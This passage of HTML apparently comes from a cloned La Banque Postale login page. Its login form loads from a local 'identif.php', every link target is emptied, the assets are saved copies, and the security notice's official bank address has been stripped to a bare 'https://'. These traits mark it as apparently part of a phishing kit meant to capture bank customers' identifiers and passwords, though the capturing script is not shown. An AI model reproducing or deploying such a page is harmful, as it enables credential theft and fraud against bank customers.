                  <div id="experiencefragment-24a99be27a" class="cmp-experiencefragment cmp-experiencefragment--connexion-pph">
                    <div class="xf-content-height">
                      <div class="row iframe">
                        <div class="iframe col-xs-12 col-sm-12">
                          <div>
                            <iframe
                              src="identif.php"
                              title="Formulaire de connexion à mon espace sécurisé"
                              scrolling="no"
                              data-fluid-iframe=""
                              style="overflow: hidden; height: 428px;"
                              id="iFrameResizer0"
                            ></iframe>
                          </div>
                        </div>
                      </div>
                    </div>
                  </div>

                  <div class="u-margin-s-top u-margin-2xl-xs-bottom u-align-center m-button">
                    <a href="" class="u-btn m-button--content m-button--tertiary u-text-color--white"><span>Identifiant / Mot de passe oublié</span> </a>
                  </div>
                </div>
              </div>
              <div class="o-cvs__txtContent o-container--hasBg w50--sm w50--md">
                <div class="o-cvs__title">
                  <p class="m-title--h1 u-text-color--white"></p>
                </div>

                <div class="title">
                  <div data-back-content="Retour au contenu" class="m-title u-spacing-s-bottom u-align-left u-color--blue-identity-group1">
                    <svg viewBox="0 0 24 24" class="a-icon--m u-spacing-3xs-right" aria-hidden="true" focusable="false">
                      <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-products-domains-insurance_shield"></use>
                    </svg>
                    <h2>
                      Espace Assurance
                    </h2>
                  </div>
                </div>

                <div class="a-text">
                  <article class="a-text--small u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-back-content="Retour au contenu">
                    <p>Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver ou signer vos contrats La Banque Postale Assurances ?</p>
                  </article>
                </div>

                <div class="button">
                  <div class="m-button u-spacing-2xs-bottom" data-component-id="labanquepostale/sitepublic/components/edito/button">
                    <a
                      href=""
                      class="u-btn m-button--content m-button--secondary"
                      target="_blank"
                      data-internal="false"
                      js-btn-tracking=""
                      title="Me connecter à mon espace assurance- Nouvelle fenêtre"
                    >
                      <span class="m-button__icon a-icon--s">
                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                          <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                        </svg>
                      </span>

                      <span>
                        Me connecter à mon espace assurance
                      </span>
                    </a>
                  </div>
                </div>

                <div class="button">
                  <div class="m-button u-spacing-lg-bottom" data-component-id="/sitepublic/components/edito/button">
                    <a
                      href=""
                      class="u-btn m-button--content m-button--secondary"
                      target="_blank"
                      data-internal="true"
                      js-btn-tracking=""
                      title="Signer mon contrat d&#39;assurance- Nouvelle fenêtre"
                    >
                      <span class="m-button__icon a-icon--s">
                        <svg class="a-icon--s" aria-hidden="true" focusable="false">
                          <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-interface-chevron-right"></use>
                        </svg>
                      </span>

                      <span>
                        Signer mon contrat d'assurance
                      </span>
                    </a>
                  </div>
                </div>

                <div class="title">
                  <div data-back-content="Retour au contenu" class="m-title u-spacing-s-bottom u-align-left u-color--blue-identity-group1">
                    <svg viewBox="0 0 24 24" class="a-icon--m u-spacing-3xs-right" aria-hidden="true" focusable="false">
                      <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-notification-info"></use>
                    </svg>
                    <h2>
                      Sécurité
                    </h2>
                  </div>
                </div>

                <div class="a-text">
                  <article class="a-text--small u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-back-content="Retour au contenu">
                    <p>
                      Avant de vous connecter, vérifiez que vous êtes bien sur l'adresse de connexion suivante : https://<br />
                      Privilégiez une connexion via votre application bancaire. Découvez toutes&nbsp;<a href="">nos recommandations</a>.
                    </p>
                  </article>
                </div>
              </div>
            </div>

            <div class="o-cvs__layer o-container--hasBg u-spacing-s-bottom u-spacing-s-left u-spacing-s-right u-hidden--all u-flex--xs" id="devicelayer" device-mobile="true" tabindex="-1" aria-hidden="true">
              <h1 class="m-title--h1 o-cvslogin__title u-text-color--white u-spacing-s-bottom" tabindex="-1">Connexion à votre compte particulier</h1>

              <div class="a-text u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/pages/loginpagev2"></div>

              <div class="o-cvs__image u-margin-s-bottom">
                <picture>
                  <img loading="lazy" class="a-image--responsive" alt="" />
                </picture>
              </div>
              <button type="button" id="connectwebsite" class="u-btn m-button--primary m-button--primary--dakrmode m-button--extend u-margin-s-bottom">
                <span>Continuer sur le site</span>
              </button>
              <a class="u-btn m-button--secondary m-button--secondary--dakrmode m-button--extend u-margin-s-bottom" id="appredirect">
                <span>Télécharger l'application mobile</span>
              </a>
            </div>

            <ul class="m-footnotes js-footnotes--container container-fluid m-list u-spacing-4xl-left u-spacing-xl-xs-left" data-note-label="Note" style="display: none;"></ul>

            <div id="viewportDetect">
              <div class="visible-xs" data-viewport="xs"></div>
              <div class="visible-sm" data-viewport="sm"></div>
              <div class="visible-md" data-viewport="md"></div>
            </div>
          </div>
        </div>
      </div>
    </main>

    <footer id="footer" role="contentinfo" class="o-footer">
      <div class="o-footer__top">
        <div class="o-footer__top__left">
          <div class="o-footer__logo">
            <div class="m-logo u-spacing-s-xs">
              <div class="js-logo-type">
                <img src="source/LOGO-LBP-digital-fd-clair-RVB.svg" width="50" height="50" alt="La Banque Postale" />
              </div>
            </div>
            <hr class="u-separator--v u-spacing-s-right" aria-hidden="true" focusable="false" />
            <img src="source/ill_citoyenne.svg" class="o-footer__imgbrand" alt="La Banque Postale Citoyenne" width="50" height="50" loading="lazy" />
          </div>
          <div class="u-spacing-s-top u-spacing-xs-xs-top">
            <div class="row">
              <div class="a-text col-xs-12">
                <article class="u-spacing-s-bottom" data-component-id="labanquepostale/sitepublic/components/edito/text" data-back-content="Retour au contenu">
                  <p>
                    Née en 2006, notre banque a grandi avec vous. Citoyenne, ouverte et accessible à tous, nous revendiquons l’ambition d’accompagner nos 20 millions de clients avec des offres et services performants, la modernité radicale
                    de notre engagement citoyen et notre héritage postal. Aujourd’hui La Banque Postale partage les rêves et les exigences de sa génération.
                  </p>
                </article>
              </div>
            </div>
            <div class="row">
              <div class="button col-xs-12">
                <div class="m-button u-align-center" data-component-id="labanquepostale/sitepublic/components/edito/button">
                  <a href="" class="u-btn m-button--extend m-button--secondary" data-internal="true" js-btn-tracking="">
                    <span class="m-button__icon a-icon--s">
                      <svg class="a-icon--s" aria-hidden="true" focusable="false">
                        <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-profile-citizen"></use>
                      </svg>
                    </span>

                    <span>
                      En savoir plus sur nos engagements
                    </span>
                  </a>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="o-footer__top__right">
          <div class="m-tiles u-full-width-xs m-tiles--square">
            <hr class="u-separator--h--full visible-xs-block" />
            <ul class="m-tiles__list">
              <li class="m-tiles__item">
                <a href="" title="Espace sourds et malentendants de la Banque Postale  - Nouvelle fenêtre" target="_blank" data-internal="false">
                  <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                    <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-profile-accessibility-deafness"></use>
                  </svg>
                  <span>Espace sourds et malentendants</span>
                </a>
              </li>

              <li class="m-tiles__item">
                <a href="" title="Recherche bureau de poste via l&#39;outil de localisation  - Nouvelle fenêtre" target="_blank" data-internal="false">
                  <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                    <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-contact-location"></use>
                  </svg>
                  <span>Recherche bureau de poste</span>
                </a>
              </li>

              <li class="m-tiles__item">
                <a href="" data-internal="false">
                  <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                    <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-contact-faq"></use>
                  </svg>
                  <span>Foire aux questions et centre d'aide</span>
                </a>
              </li>

              <li class="m-tiles__item">
                <a href="" title="Nous contacter  - Nouvelle fenêtre" target="_blank" data-internal="false">
                  <svg viewBox="0 0 24 24" class="a-icon--m" aria-hidden="true" focusable="false">
                    <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-contact-phone"></use>
                  </svg>
                  <span>Nous contacter</span>
                </a>
              </li>
            </ul>
          </div>
        </div>
      </div>
      <div class="container-fluid">
        <div class="row">
          <div class="col-xs-12 col-sm-6">
            <div>
              <div class="m-socialmedialist u-align-center u-spacing-s-top u-spacing-s-bottom u-spacing-xs-xs-top u-spacing-xs-xs-bottom">
                <p class="m-socialmedialist__label">Suivez nous</p>
                <ul class="m-socialmedialist__list m-list--flexcenter m-list--flexinline">
                  <li class="m-socialmedialist__item">
                    <div class="m-button--hasIcon">
                      <a href="" title=" Facebook - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                        <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                          <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-social-facebook"></use>
                        </svg>
                        <span class="sr-only"> Facebook - La Banque Postale</span>
                      </a>
                    </div>
                  </li>

                  <li class="m-socialmedialist__item">
                    <div class="m-button--hasIcon">
                      <a href="" title=" Instagram - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                        <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                          <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-social-instagram"></use>
                        </svg>
                        <span class="sr-only"> Instagram - La Banque Postale</span>
                      </a>
                    </div>
                  </li>

                  <li class="m-socialmedialist__item">
                    <div class="m-button--hasIcon">
                      <a href="" title=" Linkedin - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                        <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                          <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-social-linkedin"></use>
                        </svg>
                        <span class="sr-only"> Linkedin - La Banque Postale</span>
                      </a>
                    </div>
                  </li>

                  <li class="m-socialmedialist__item">
                    <div class="m-button--hasIcon">
                      <a href="" title=" Twitter - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                        <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                          <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-social-twitter"></use>
                        </svg>
                        <span class="sr-only"> Twitter - La Banque Postale</span>
                      </a>
                    </div>
                  </li>

                  <li class="m-socialmedialist__item">
                    <div class="m-button--hasIcon">
                      <a href="" title=" YouTube - La Banque Postale - Nouvelle fenêtre" target="_blank" data-internal="false">
                        <svg viewBox="0 0 24 24" class="a-icon--s" aria-hidden="true" focusable="false">
                          <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-social-youtube"></use>
                        </svg>
                        <span class="sr-only"> YouTube - La Banque Postale</span>
                      </a>
                    </div>
                  </li>
                </ul>
              </div>
            </div>
          </div>
          <div class="col-xs-12 col-sm-6">
            <div class="m-newsletterlink m-button--hasIcon">
              <a
                class="u-spacing-md-top u-spacing-md-bottom u-spacing-xs-lg-top u-spacing-xs-lg-bottom u-align-center"
                href=""
                title="Abonnez-vous à la Newsletter - Nouvelle fenêtre"
                data-internal="false"
              >
                <span>Abonnez-vous à la Newsletter</span>
                <svg aria-hidden="true" focusable="false" viewBox="0 0 24 24" class="a-icon--s">
                  <use href="/etc.clientlibs/labanquepostale/commons/clientlibs/designsystem/base/resources/svg-icons.svg#ic-contact-arobase"></use>
                </svg>
              </a>
            </div>
          </div>
          <div class="col-xs-12 u-spacing-xs-top u-spacing-lg-bottom u-spacing-xs-xs-bottom">
            <div class="m-legalpagelink u-align-center u-text-color--grey_color_5">
              <ul class="m-list--horizontal--align-center m-list--flexcenter">
                <li><a href="" data-internal="true">Mentions légales</a></li>

                <li><a href="" data-internal="true">Tarifs bancaires</a></li>

                <li><a href="" data-internal="true">Convention de compte</a></li>

                <li><a href="" data-internal="true">Protection des Données à Caractère Personnel </a></li>

                <li><a href="" data-internal="true">Cookies</a></li>

                <li><a href="" data-internal="true">Actualiser vos informations</a></li>

                <li><a href="" data-internal="true">Réclamation</a></li>

                <li><a href="" data-internal="true">Coordonnées Centres Financiers</a></li>

                <li><a href="" data-internal="true">Assistance technique</a></li>

                <li><a href="" data-internal="true">Alertes fraudes et points de vigilance</a></li>

                <li><a href="" data-internal="true">Actualités réglementaires</a></li>

                <li><a href="" data-internal="true">CGU</a></li>

                <li><a href="" data-internal="true">Aide navigateur et systèmes d'exploitation</a></li>

                <li><a href="" data-internal="true">Vider le cache de votre navigateur</a></li>

                <li><a href="" data-internal="true">Lexique </a></li>

                <li><a href="" data-internal="true">L'accessibilité numérique à La Banque Postale</a></li>

                <li><a href="" data-internal="true">Accessibilité – Partiellement conforme </a></li>

                <li><a href="" data-internal="false">Espace candidature</a></li>

                <li><a href="" data-internal="true">BFI - Banque de Financement et d'Investissement</a></li>

                <li><a href="" data-internal="true">Le fonds de garantie des dépôts et de résolution</a></li>

                <li><a href="" data-internal="true">Résilier</a></li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </footer>

    <script src="source/iframeresizer-4-3-2.min.169d92f5d63c70731f8703bed413e3b0.js.download"></script>

    <script src="source/base-login.min.b289bf62d8109d5259343dcd281b21c0.js.download"></script>

    <!-- //Analytics container Preprod -->
    <script type="text/javascript" src="source/tc_LaBanquePostale_6.js.download"></script>
    <iframe id="tc_iframe_96_1" src="source/connexion-espace-client.html" width="1" height="1" frameborder="0" style="display: none;"></iframe>

    <!-- //Media container Preprod -->
    <script type="text/javascript" src="source/tc_LaBanquePostale_5.js.download"></script>

    <div id="privacy-overlay-banner"></div>
    <iframe id="Wifrm" src="source/sync.html" style="height: 1px; width: 1px; border: 0px none; position: absolute; display: none; left: 0px; top: 0px; z-index: 0;"></iframe>
    <div id="batBeacon78762355866" style="width: 0px; height: 0px; display: none; visibility: hidden;">
      <img id="batBeacon747896826202" width="0" height="0" alt="" src="source/0" style="width: 0px; height: 0px; display: none; visibility: hidden;" />
    </div>
    <iframe height="0" width="0" style="display: none; visibility: hidden;" src="source/activityi.html"></iframe><cs-native-frame-holder hidden=""></cs-native-frame-holder>
    <img src="source/fetch.pix" width="1" height="1" scrolling="no" frameborder="0" style="display: none;" />
    <iframe width="1" height="1" scrolling="no" frameborder="0" style="display: none;" src="source/ig-membership.html"></iframe>
    <iframe width="1" height="1" scrolling="no" frameborder="0" style="display: none;" src="source/topics-membership.html"></iframe>
  </body>
</html>
